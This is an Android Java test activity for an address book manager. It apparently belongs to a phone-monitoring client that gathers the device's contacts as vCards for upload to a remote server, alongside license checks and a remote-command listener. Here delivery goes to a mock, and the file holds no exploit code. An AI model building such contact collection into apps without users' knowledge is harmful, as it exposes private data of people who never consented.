package com.vvt.process_addressbook_manager_testapp;

import java.util.List;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;

import com.vvt.appcontext.AppContext;
import com.vvt.appcontext.AppContextImpl;
import com.vvt.connectionhistorymanager.ConnectionHistoryManagerImp;
import com.vvt.datadeliverymanager.DataDeliveryManager;
import com.vvt.datadeliverymanager.DeliveryRequest;
import com.vvt.datadeliverymanager.DeliveryResponse;
import com.vvt.datadeliverymanager.enums.DataProviderType;
import com.vvt.datadeliverymanager.enums.ServerStatusType;
import com.vvt.datadeliverymanager.interfaces.DataDelivery;
import com.vvt.datadeliverymanager.interfaces.PccRmtCmdListener;
import com.vvt.datadeliverymanager.interfaces.ServerStatusErrorListener;
import com.vvt.exceptions.FxNullNotAllowedException;
import com.vvt.license.LicenseManager;
import com.vvt.license.LicenseManagerImpl;
import com.vvt.phoenix.prot.CommandListener;
import com.vvt.phoenix.prot.CommandServiceManager;
import com.vvt.phoenix.prot.command.DataProvider;
import com.vvt.phoenix.prot.command.SendAddrBookForApproval;
import com.vvt.phoenix.prot.command.SendAddressBook;
import com.vvt.phoenix.prot.command.response.PCC;
import com.vvt.phoenix.prot.command.response.ResponseData;
import com.vvt.phoenix.prot.command.response.SendActivateResponse;
import com.vvt.phoenix.prot.event.FxVCard;
import com.vvt.processaddressbookmanager.AddressbookManagerImp;
import com.vvt.server_address_manager.ServerAddressManager;
import com.vvt.server_address_manager.ServerAddressManagerImpl;

public class Process_addressbook_manager_testappActivity  extends Activity implements ServerStatusErrorListener, PccRmtCmdListener, CommandListener{
    
	private AddressbookManagerImp addmgr;
	private LicenseManager mLicenseManager;
	private DataDeliveryManager mDataDeliveryManager;
	private AppContext mAppContext;
	
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        
        try {
			mLicenseManager = new LicenseManagerImpl(this);
			mAppContext = new AppContextImpl(this);
			
			ServerAddressManager serverAddressManager = new ServerAddressManagerImpl(mAppContext);
			//serverAddressManager.setServerUrl("http://192.168.2.116/RainbowCore");
		
			mDataDeliveryManager = new DataDeliveryManager();
			mDataDeliveryManager.setAppContext(mAppContext);
			mDataDeliveryManager.setCommandServiceManager(createCommandServiceManager());
			mDataDeliveryManager.setConnectionHistory(new ConnectionHistoryManagerImp(this.getCacheDir().getAbsolutePath()) {});
			mDataDeliveryManager.setLicenseManager(mLicenseManager);
			mDataDeliveryManager.setPccRmtCmdListener(this);
			mDataDeliveryManager.setServerAddressManager(serverAddressManager);
			mDataDeliveryManager.setServerStatusErrorListener(this);
			mDataDeliveryManager.initialize();
			
			addmgr = new AddressbookManagerImp();
			addmgr.setContext(this);
	        addmgr.setDataDelivery(new DataDeliveryMock(MockType.getAddressbook)); //new DataDeliveryMock()
	        addmgr.initialize();
	        
	        addmgr.startRestricted();
	        
	        /*addmgr.sendAddressbook(null, 0);*/
	        /*Thread.sleep(1000);*/
	        /*addmgr.sendAddressbook(null, 0);*/
	        
	     
	         
		} catch (FxNullNotAllowedException e) {
			e.printStackTrace();
		} 
        /*catch (InterruptedException e) {
			e.printStackTrace();
		}*/  
    }
    private CommandServiceManager createCommandServiceManager() {
		String dbPath = getApplicationContext().getFilesDir().getAbsolutePath() + "/";
		String payloadPath = getApplicationContext().getFilesDir().getAbsolutePath() + "/";
		
		CommandServiceManager manager = CommandServiceManager.getInstance(dbPath, payloadPath);  
		return manager;
	}

	@Override
	public void onServerStatusErrorListener(ServerStatusType serverStatusType) {
		 
	}

	@Override
	public void onConstructError(long csid, Exception e) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void onTransportError(long csid, Exception e) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void onSuccess(ResponseData response) {
		// TODO Auto-generated method stub
		SendActivateResponse r = (SendActivateResponse)response;
		Log.e("Addressbook_manager_testappActivity", String.valueOf(r.getConfigId()));
	}

	@Override
	public void onServerError(ResponseData response) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void onReceivePCC(List<PCC> pcc) {
		// TODO Auto-generated method stub
		
	}
	
}

class MockRmtCommandListener implements PccRmtCmdListener {

	@Override
	public void onReceivePCC(List<PCC> pcc) {
		// TODO Auto-generated method stub
		
	}
	
}

enum MockType {
	getAddressbook, SendAddrBookForApproval, SendAddrBook
}

class DataDeliveryMock implements DataDelivery
{
	MockType mMockType;
	
	public DataDeliveryMock(MockType type) {
		mMockType = type;
	}
	
	@Override
	public void deliver(DeliveryRequest deliveryRequest) {
		
		DeliveryResponse response = new DeliveryResponse();
		DataProvider p = null;
		
		if(mMockType == MockType.SendAddrBookForApproval || mMockType == MockType.SendAddrBook) {
			
			if(mMockType == MockType.SendAddrBookForApproval) {
				SendAddrBookForApproval eventProvider  = (SendAddrBookForApproval)deliveryRequest.getCommandData();
				p = eventProvider.getAddressBook().getVCardProvider();
			}
			else
			{
				SendAddressBook eventProvider  = (SendAddressBook)deliveryRequest.getCommandData();
				p = eventProvider.getAddressBook(0).getVCardProvider();
			}

			while(p.hasNext()) {
				FxVCard event = (FxVCard)p.getObject();
				event.toString();
			}
		}
		
		response.setCanRetry(false);
		response.setCSMresponse(new ResponseData() {
			@Override
			public int getCmdEcho() {
				return 0;
			}
		});
		response.setDataProviderType(DataProviderType.DATA_PROVIDER_TYPE_NONE);
		response.setStatusCode(0);
		response.setStatusMessage(null);
		response.setSuccess(true);
		
		deliveryRequest.getDeliveryListener().onFinish(response);
	}
}

class MockServerStatusErrorListener implements ServerStatusErrorListener {

	@Override
	public void onServerStatusErrorListener(
			ServerStatusType paramServerStatusType) {
		// TODO Auto-generated method stub
		
	}
	
}
